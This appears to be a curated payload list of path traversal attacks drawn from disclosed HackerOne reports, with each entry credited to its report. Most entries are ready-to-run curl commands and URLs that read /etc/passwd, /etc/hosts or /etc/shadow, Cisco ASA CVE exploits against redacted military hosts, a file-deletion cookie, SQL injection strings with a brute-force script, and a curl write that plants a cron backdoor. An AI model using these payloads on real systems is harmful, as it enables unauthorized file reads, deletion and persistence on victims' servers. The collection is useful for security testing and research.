# Path Traversal

186 payloads from disclosed reports.

## Directory traversal using '..' in URL path and query parameter to read /sessions

### `a71d969a`

```
curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

— [\[glance\] Path Traversal in glance static file server allows to read content of arbitrary file](https://hackerone.com/reports/310106) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `7c924725`

```
curl -i -k "https://1████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://1████████ (https://████████.███.████████/)](https://hackerone.com/reports/694861) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `0d1c561b`

```
curl -i -k "https://1█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://1████████ (https://████████.███.████████/)](https://hackerone.com/reports/694861) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `e7a65027`

```
curl -i -k "https://███.████.█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://1████████ (https://████████.███.████████/)](https://hackerone.com/reports/694861) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b144a915`

```
curl -i -k "https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://██████████](https://hackerone.com/reports/694865) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `0bd3f02a`

```
curl -i -k "https://█████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://██████████](https://hackerone.com/reports/694865) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `4bc08895`

```
http://target.com/url/demo/../test
```

— [\[h1-415 2020\] H1-415 CTF Writeup by W--](https://hackerone.com/reports/780285) · h1-ctf · [w--](https://hackerone.com/w--)

### `f1c4682a`

```
"url":"https:\/\/target.com\/api\/accounts\/..\/..\/F8gHiqSdpK\/statements?month=05&year=2020"
```

— [\[H1-2006 2020\] From multiple vulnerabilities to complete ATO on any customer account and staff admin](https://hackerone.com/reports/894863) · h1-ctf · [rreiss](https://hackerone.com/rreiss)

### `fcc45cbe`

```
target.com/+CSCOU+/../+CSCOE+/files/file_list.json
```

— [CVE-2018-0296 Cisco ASA Denial of Service & Path Traversal vulnerable on \[target.com\]](https://hackerone.com/reports/2375666) · MTN Group · [deb0con](https://hackerone.com/deb0con)


## Path traversal with query parameter "path" on full domain

### `97cb8e98`

```
curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b
```

**Parameter:** `path`
— [https://█████████ Vulnerable to CVE-2018-0296 Cisco ASA Path Traversal Authentication Bypass](https://hackerone.com/reports/622864) · U.S. Dept Of Defense · [warsong](https://hackerone.com/warsong)

### `d11e3b43`

```
curl -i -k "https://███████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███ (████████████████)](https://hackerone.com/reports/695427) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `71ce2855`

```
curl -i -k "https://█████.████.█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███ (████████████████)](https://hackerone.com/reports/695427) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `8aac1db3`

```
curl -i -k "https://█████████.██████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (████.███.mil)](https://hackerone.com/reports/695429) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b1f76538`

```
curl -i -k "https://████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (██████)](https://hackerone.com/reports/695776) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `fe1299f3`

```
curl -i -k "https://█████████.███████.mil/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (██████)](https://hackerone.com/reports/695776) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `197b04c7`

```
curl -i -k "https://████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (no hostname)](https://hackerone.com/reports/695780) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `2854c2dd`

```
curl -i -k "https://███████.███████.mil/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (no hostname)](https://hackerone.com/reports/695780) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `6cbf8070`

```
curl -i -k "https://mvpn3.███/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions" --path-as-is
```

**Parameter:** `path`
— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (█████████.mil)](https://hackerone.com/reports/696400) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)


## Directory traversal via URL parameter (lang) using ../

### `a64da49f`

```
curl -k "https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://████████](https://hackerone.com/reports/959679) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `a2072ed5`

```
curl -k "https://████████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://████████](https://hackerone.com/reports/959679) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `8ba0403d`

```
https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://████████](https://hackerone.com/reports/959679) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `a7eec57f`

```
curl -k "https://██████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" --output portal_inc.lua
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://█████](https://hackerone.com/reports/960082) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `8e061ec6`

```
curl -k "https://███████/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session.js&default-language&lang=../" --output session.js
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://█████](https://hackerone.com/reports/960082) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)

### `cb38479c`

```
https://███/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

**Parameter:** `lang`
— [Read-only path traversal (CVE-2020-3452)  at https://█████](https://hackerone.com/reports/960082) · U.S. Dept Of Defense · [raginalstorm](https://hackerone.com/raginalstorm)


## Path traversal via URL path using "../" sequences

### `5d9abc7a`

```
https://target.com/cloudsql-proxy/../swordlight/load_my_evil_dag.py?a=/cloud_sql_proxy.linux.amd64
```

— [CVE-2023-25692: Apache Airflow Google Provider: Google Cloud Sql Provider Denial Of Service and Remote Command Execution](https://hackerone.com/reports/1895316) · Internet Bug Bounty · [sw0rd1ight](https://hackerone.com/sw0rd1ight) · $480.0

### `a26b7cbc`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

— [\[mcstatic\] Path Traversal allows to read content of arbitrary files](https://hackerone.com/reports/312907) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `45a03b3b`

```
$ curl --path-as-is --url 'http://127.0.0.1:8080/../../../../etc/passwd'
```

— [\[static-resource-server\]  Path Traversal allows to read content of arbitrary file on the server](https://hackerone.com/reports/432600) · Node.js third-party modules · [libcontainer](https://hackerone.com/libcontainer)

### `b29bc166`

```
fmunozs@ashes MINGW64 ~/Downloads/curl-7.66.0_2-win64-mingw/curl-7.66.0-win64-mingw/bin
$ ./curl -v "http://localhost/safepath/something#/../../anotherpath/somethingelse"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

*   Trying ::1:80...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /s
```

— [SMB access smuggling via FILE URL on Windows](https://hackerone.com/reports/726117) · curl · [fms](https://hackerone.com/fms)

### `5d292091`

```
/metrics../
```

— [Off-by-slash vulnerability in target.com and evil.com](https://hackerone.com/reports/1631350) · Node.js · [nagaro](https://hackerone.com/nagaro)

### `88dee26d`

```
https://target.com/metrics../.bashrc
```

— [Off-by-slash vulnerability in target.com and evil.com](https://hackerone.com/reports/1631350) · Node.js · [nagaro](https://hackerone.com/nagaro)


## Directory traversal via path‑traversal sequences in a URL to read /etc/passwd

### `933a90a9`

```
❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest"

# test file is generated
❯ ls
app  config     db       Gemfile.lock  log           public    target.com  test       tmp
bin  evil.com  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor


❯ curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd"

# If the file exists it will be overwritten
❯ cat target.com
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

— [File writing by Directory traversal at actionpack-page_caching and RCE by it](https://hackerone.com/reports/519220) · Ruby on Rails · [ooooooo_q](https://hackerone.com/ooooooo_q) · $1,000.0

### `3664c4fb`

```
$ curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

— [\[mcstatic\] Server Directory Traversal](https://hackerone.com/reports/330285) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)

### `3cb385f9`

```
POST /admin/file/upload HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/
Content-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043
Cookie: [ADMINISTRATOR_COOKIE]

-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="upload_file"; filename="app.js"
Content-Type: image/png

[MALICIOUS_JAVASCRIPT]
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="productId"
```

**Parameter:** `directory`
— [Unrestricted file upload (RCE)](https://hackerone.com/reports/343726) · Node.js third-party modules · [patrickrbc](https://hackerone.com/patrickrbc)

### `44f33414`

```
curl -H “Cookie: token=../+CSCOU+/csco_logo.gif” https://█████/+CSCOE+/session_password.html
```

**Parameter:** `token`
— [https://██████ vulnerable to CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD](https://hackerone.com/reports/987090) · U.S. Dept Of Defense · [pwnsauc3_](https://hackerone.com/pwnsauc3_)

### `276a346c`

```
https://target.com/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
```

— [Grafana LFI on https://target.com](https://hackerone.com/reports/1419213) · MariaDB · [tess](https://hackerone.com/tess)


## Path traversal using ".." in the request URL

### `23e5e0a7`

```
curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json
```

— [https://█████████ Vulnerable to CVE-2018-0296 Cisco ASA Path Traversal Authentication Bypass](https://hackerone.com/reports/622864) · U.S. Dept Of Defense · [warsong](https://hackerone.com/warsong)

### `9680e640`

```
curl -i -k "https://███/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███ (████████████████)](https://hackerone.com/reports/695427) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `b0b990c3`

```
curl -i -k "https://████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (████.███.mil)](https://hackerone.com/reports/695429) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `3abeee11`

```
curl -i -k "https://████████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://███████/ (██████)](https://hackerone.com/reports/695776) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `bae5d803`

```
curl -i -k "https://██████/+CSCOU+/../+CSCOE+/files/file_list.json" --path-as-is
```

— [\[CVE-2018-0296\] Cisco VPN path traversal on the https://████████/ (no hostname)](https://hackerone.com/reports/695780) · U.S. Dept Of Defense · [sp1d3rs](https://hackerone.com/sp1d3rs)


## UNION‑based SQL injection to include '../api/x' via hash parameter

### `eca39a51`

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
```

**Parameter:** `hash`
— [A Visit from The Grinch ~ 'Twas the night before Hackmas...](https://hackerone.com/reports/1067912) · h1-ctf · [bendtheory](https://hackerone.com/bendtheory)

### `101798d3`

```
' and 1=0 union select 1,2,'../../' -- .
```

**Parameter:** `hash`
— [\[H1 hackyholidays\] CTF Writeup](https://hackerone.com/reports/1069171) · h1-ctf · [macasun](https://hackerone.com/macasun)

### `a8ee0a8a`

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `0ff6f7d9`

```
https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)

### `1c9f6893`

```
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://target.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
        
```

**Parameter:** `hash`
— [h1-ctf : 12 days of hack holiday writeup](https://hackerone.com/reports/1069175) · h1-ctf · [webhak](https://hackerone.com/webhak)


## Path traversal via crafted filename in multipart/form-data upload

### `86ed6b35`

```
<!doctype html>
<html>
  <body>
    <form action="/upload" method="post" enctype="multipart/form-data">
      <input
        type="file"
        name="upload"
        value="calc.exe"
        accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
      <button type="submit">Upload</button>
    </form>
  </body>
</html>
```

— [Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling](https://hackerone.com/reports/3712279) · PortSwigger Web Security · [kawakatz](https://hackerone.com/kawakatz) · $5,000.0

### `1f422f8a`

```
Content-Disposition: form-data; name="file"; filename="/../../../../../.html"
```

**Parameter:** `file`
— [Internal Path Disclosure](https://hackerone.com/reports/979110) · CS Money · [mr_vrush](https://hackerone.com/mr_vrush) · $100.0

### `24d76852`

```
../../../lib-1/libjnigraphics.so
```

— [2 click Remote Code execution in Evernote Android](https://hackerone.com/reports/1377748) · Evernote · [hulkvision_](https://hackerone.com/hulkvision_)

### `c3853b4c`

```
../../../lib-1/libjnigraphics
```

— [2 click Remote Code execution in Evernote Android](https://hackerone.com/reports/1377748) · Evernote · [hulkvision_](https://hackerone.com/hulkvision_)


## Directory traversal via curl request to ../../../../etc/passwd

### `079a89ea`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

— [\[file-static-server\] Path Traversal allows to read content of arbitrary file on the server](https://hackerone.com/reports/310671) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `c58d497e`

```
$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
```

— [\[hekto\] Path Traversal vulnerability allows to read content of arbitrary files](https://hackerone.com/reports/311218) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `544fbfee`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

— [\[localhost-now\] Path Traversal allows to read content of arbitrary file](https://hackerone.com/reports/312889) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Directory traversal using the 'filePathDownload' parameter to read arbitrary files (e.g., /etc/passwd)

### `77587dfd`

```
https://████████/download.php?filePathDownload=data_products/../../../../../etc/passwd
```

**Parameter:** `filePathDownload`
— [Local file read at https://████/ \[HtUS\]](https://hackerone.com/reports/1626210) · U.S. Dept Of Defense · [sudi](https://hackerone.com/sudi)

### `e348b8dd`

```
https://█████/download.php?filePathDownload=data_products/../download.php
```

**Parameter:** `filePathDownload`
— [Local file read at https://████/ \[HtUS\]](https://hackerone.com/reports/1626210) · U.S. Dept Of Defense · [sudi](https://hackerone.com/sudi)

### `9906a525`

```
https://███████.mil/download.php?filePathDownload=data_products/MISC/frida_cal/../../../../../../../../etc/passwd
```

**Parameter:** `filePathDownload`
— [Local File Inclusion in download.php](https://hackerone.com/reports/1639364) · U.S. Dept Of Defense · [tokyoenigma](https://hackerone.com/tokyoenigma)


## Directory traversal via path manipulation in URL

### `7b91e8c4`

```
live_reload ${attacker_server}/..\\..\\traversal_poc.dll
```

— [Mozilla VPN Clients: RCE via file write and path traversal](https://hackerone.com/reports/2995025) · Mozilla · [trein](https://hackerone.com/trein) · $6,000.0

### `f12655de`

```
http://192.168.144.128/nextcloud/remote.php/dav/files/user/../.bash_profile
```

— [Linux client is vulnerable to directory traversal when downloading files](https://hackerone.com/reports/590319) · Nextcloud · [netranger](https://hackerone.com/netranger) · $250.0

### `ca7e1738`

```
GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

— [Path Traversal in App Proxy](https://hackerone.com/reports/869888) · Shopify · [ngalog](https://hackerone.com/ngalog)


## Directory traversal using relative path in the 'name' field

### `c434c0d5`

```
../../../../../any/where
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0

### `c79009b1`

```
../../../../../../../../../../tmp/malicious
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0

### `2be3302c`

```
../gems/rack
```

**Parameter:** `name`
— [Installing a crafted gem package may create or overwrite files](https://hackerone.com/reports/243156) · RubyGems · [mame](https://hackerone.com/mame) · $1,000.0


## Open redirect via directory‑traversal in the account_id JSON field to inject an arbitrary URL

### `b8005ddd`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/search?q=REST+API#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `a10cb09e`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)

### `73211d2d`

```
<@base64_2>{"account_id":"../../redirect?url=https://target.com/uploads/BountyPay.apk#","hash":0}<@/base64_2>
```

**Parameter:** `account_id`
— [\[H1-2006 2020\] Writeup](https://hackerone.com/reports/894170) · h1-ctf · [njbooher3](https://hackerone.com/njbooher3)


## Path traversal via CSV field referencing a file outside the intended directory

### `685b8b3d`

```
Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
Enabled,Default campaign,Display Network only,Default Group,Something,Something,Something,Something,../../../usr/share/pixmaps/debian-logo.png,../../../usr/share/pixmaps/debian-logo.png,../../../usr/share/pixmaps/debian-logo.png,,http://target.com,,
```

— [Ad Builder Display Ads Path Traversal](https://hackerone.com/reports/316713) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `cc4f0e1b`

```
Status,Campaign,Campaign Type,Ad Group,Short headline,Long headline,Description,Business name,Image,Square image,Logo,Landscape logo,Final URL,Final mobile URL,Tracking URL
Enabled,Default Campaign,Display Network only,Default Group,Something,Something,Something,Something,../../../██████/█████/1.png,../../../███████/█████/1.png,../../../████/█████/1.png,,http://target.com,,
```

— [Ad Builder Display Ads Path Traversal](https://hackerone.com/reports/316713) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)

### `79b71fc7`

```
../../../usr/share/pixmaps/debian-logo.png
```

— [Ad Builder Display Ads Path Traversal](https://hackerone.com/reports/316713) · Semrush · [ajxchapman](https://hackerone.com/ajxchapman)


## Path traversal using double‑slash bypass in the request URL

### `133a4e70`

```
curl --path-as-is http://localhost:8080//../../../../etc/passwd
```

— [\[http-live-simulator\] Path traversal vulnerability](https://hackerone.com/reports/411405) · Node.js third-party modules · [3la2kb](https://hackerone.com/3la2kb)

### `69826f1c`

```
http://localhost:8080//../../../../etc/passwd
```

— [\[http-live-simulator\] Path traversal vulnerability](https://hackerone.com/reports/411405) · Node.js third-party modules · [3la2kb](https://hackerone.com/3la2kb)

### `27332459`

```
https://target.com/cms/audioitems//etc/shadow
```

— [\[target.com\] Path Traversal al /cms/audioitems](https://hackerone.com/reports/2424815) · PortSwigger Web Security · [0xd0m7](https://hackerone.com/0xd0m7)


## Path traversal using relative path in Cookie token to read arbitrary files

### `2230ba6e`

```
'../../abc/xyz'
```

— [URI scheme bypass in mail app lead to HTML content spoof and opener control](https://hackerone.com/reports/175085) · Nextcloud · [trichimtrich_](https://hackerone.com/trichimtrich_)

### `20cbcf09`

```
> curl -skiL "https://███████/+CSCOE+/session_password.html" \
  -H "Cookie: token=../+CSCOU+/csco_logo.gif"
```

**Parameter:** `token`
— [Unauthenticated Arbitrary File Deletion ("CVE-2020-3187") in ████████](https://hackerone.com/reports/978335) · U.S. Dept Of Defense · [dwisiswant0](https://hackerone.com/dwisiswant0)

### `5336bd31`

```
GET /+CSCOE+/session_password.html HTTP/1.1
Host: ███████
Cookie: token=../+CSCOU+/csco_logo.gif
User-Agent: curl/7.47.0
Accept: */*
```

**Parameter:** `token`
— [Unauthenticated Arbitrary File Deletion ("CVE-2020-3187") in ████████](https://hackerone.com/reports/978335) · U.S. Dept Of Defense · [dwisiswant0](https://hackerone.com/dwisiswant0)


## Path traversal using ../ sequences in URL path to read /etc/passwd

### `ac9a6b53`

```
http://127.0.0.1:8080/node_modules/../../../../../etc/passwd
```

— [\[deliver-or-else\] Path Traversal](https://hackerone.com/reports/507310) · Node.js third-party modules · [johnssimon007](https://hackerone.com/johnssimon007)

### `0e105133`

```
curl --path-as-is -k -D- 'https://███████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#'
```

— [\[CVE-2019-11510 \] Path Traversal on ████████ leads to leaked passwords, RCE, etc](https://hackerone.com/reports/671857) · U.S. Dept Of Defense · [cdl](https://hackerone.com/cdl)

### `42e8f9d1`

```
{
    "url": "https:\/\/target.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/?\/statements?month=01&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>BountyPay | Login<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n<div class=\"container\">\
```

**Parameter:** `url`
— [\[H1-2006 2020\] Multiple vulnerabilities allow to leak sensitive information ](https://hackerone.com/reports/895202) · h1-ctf · [zoczus](https://hackerone.com/zoczus)


## Command injection payload using curl -o with "../../etc/cron.daily/zzz-backdoor" to write a backdoor via path traversal

### `bcc3c877`

```
sudo curl                                   -o "../../etc/cron.daily/zzz-backdoor"
```

— [\[High\] Arbitrary File Write via Path Traversal in cURL CLI (`-o`, `--output`) (CWE-22: Improper Limitation of a Pathname to a Restricted Directory)](https://hackerone.com/reports/3120987) · curl · [oicus](https://hackerone.com/oicus)

### `bc2fda36`

```
- curl                 -o "../../.gitlab-ci.yml"
```

— [\[High\] Arbitrary File Write via Path Traversal in cURL CLI (`-o`, `--output`) (CWE-22: Improper Limitation of a Pathname to a Restricted Directory)](https://hackerone.com/reports/3120987) · curl · [oicus](https://hackerone.com/oicus)


## Directory traversal via crafted URL path (../.. sequences)

### `c9f1b1dc`

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd
```

— [\[angular-http-server\] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server](https://hackerone.com/reports/309120) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)

### `ec0a6177`

```
$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
```

— [\[node-srv\] Path Traversal allows to read arbitrary files from remote server](https://hackerone.com/reports/309124) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Directory traversal exploiting path normalization to read /etc/passwd via URL path

### `1a3654de`

```
$ curl --path-as-is --url 'http://127.0.0.1:8888/../../../../etc/passwd'
```

— [\[hnzserver\] Path Traversal allowing to read any files on the server](https://hackerone.com/reports/579517) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)

### `5a2c59f1`

```
$ curl --path-as-is --url 'http://localhost:8888/../../../../../etc/passwd'
```

— [\[http_server\] Path Traversal allowing to read any files on the server](https://hackerone.com/reports/579523) · Node.js third-party modules · [lightangel1412](https://hackerone.com/lightangel1412)


## Directory traversal via filename query parameter

### `fcd1fe67`

```
https://█████████/███/login/downloadForm?filename=../../../../../../../../etc/hosts
```

**Parameter:** `filename`
— [Path traversal leads to reading of local files on ███████ and ████](https://hackerone.com/reports/1888808) · U.S. Dept Of Defense · [rodriguezjorgex](https://hackerone.com/rodriguezjorgex)

### `213aa33d`

```
https://██████████/████/login/downloadForm?filename=../../../../../../../../etc/hosts
```

**Parameter:** `filename`
— [Path traversal leads to reading of local files on ███████ and ████](https://hackerone.com/reports/1888808) · U.S. Dept Of Defense · [rodriguezjorgex](https://hackerone.com/rodriguezjorgex)


## Directory traversal via '../../..' in the JSON field "trained_at"

### `82f8fd8f`

```
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

**Parameter:** `trained_at`
— [Internal machine learning API endpoint for CWE classification is vulnerable to path traversal](https://hackerone.com/reports/2032778) · HackerOne · [jobert](https://hackerone.com/jobert)

### `6873d130`

```
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

**Parameter:** `version`
— [Internal machine learning API endpoint for CWE classification is vulnerable to path traversal](https://hackerone.com/reports/2032778) · HackerOne · [jobert](https://hackerone.com/jobert)


## Directory traversal via the 'timezone' parameter to read /etc/passwd

### `e0cef4b2`

```
timezone=../../../etc/passwd
```

**Parameter:** `timezone`
— [File name and folder enumeration.](https://hackerone.com/reports/118688) · Shopify · [derision](https://hackerone.com/derision) · $500.0

### `a31d32f5`

```
timezone=../../../etc/passwd_error
```

**Parameter:** `timezone`
— [File name and folder enumeration.](https://hackerone.com/reports/118688) · Shopify · [derision](https://hackerone.com/derision) · $500.0


## Directory traversal via the upload_path parameter to reach a writable directory

### `779e7596`

```
../../../../../../../var/tmp/content/../../../../../../home/user/html/wordpress/../../../../../../var/tmp/content
```

**Parameter:** `upload_path`
— [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) · WordPress · [simonscannell](https://hackerone.com/simonscannell)

### `40d26d5e`

```
../../../../../../../var/tmp/
```

**Parameter:** `upload_path`
